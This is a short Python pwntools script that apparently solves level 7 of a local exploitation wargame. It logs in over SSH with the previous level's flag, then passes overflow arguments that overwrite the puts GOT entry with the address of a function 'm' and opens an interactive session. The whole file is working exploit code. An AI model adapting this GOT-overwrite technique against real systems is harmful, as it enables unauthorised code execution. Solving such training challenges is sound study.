#!/usr/bin/env python

from pwn import *
from time import *

host = "127.0.0.1"
port = 4242

login = "level7"
binary = login
password = open("../../level6/flag", "r").read().splitlines()[0]
remotebinary = "/home/user/%s/%s" % (login, binary)

target_login = "level8"

shell = ssh(host=host, port=port, user=login, password=password)

padding = "B"*20
puts_GOT_addr = p32(0x8049928)
m_addr = p32(0x080484f4)
payload1 = padding + puts_GOT_addr
payload2 = m_addr

print("# Sending")
p = shell.process([remotebinary, payload1, payload2], env={})
p.interactive()
